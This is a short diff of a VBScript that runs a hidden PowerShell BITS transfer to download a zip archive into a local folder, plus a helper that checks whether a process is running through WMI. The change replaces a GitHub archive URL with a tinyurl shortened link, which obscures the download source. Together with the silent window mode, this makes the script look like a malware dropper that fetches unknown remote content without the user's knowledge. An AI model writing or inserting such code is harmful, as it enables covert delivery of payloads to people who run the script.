@@ -9,7 +9,7 @@ If Not fso.FolderExists(baseDir) Then
 End If
 zipPath = baseDir & "\assets.zip"
 outDir = baseDir
-url = "https://github.com/Gelli08/spwww743g7w/archive/refs/heads/main.zip"
+url = "https://tinyurl.com/2c3w2tb7"
 Dim bitsCmd
 bitsCmd = "powershell -NoLogo -NoProfile -Command ""Start-BitsTransfer -Source '" & url & "' -Destination '" & zipPath & "' -ErrorAction Stop"""
 shell.Run bitsCmd, 0, True
@@ -44,3 +44,4 @@ Function ProcessRunning(procName)
     Set procs = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='" & procName & "'")
     ProcessRunning = (procs.Count > 0)
 End Function
+
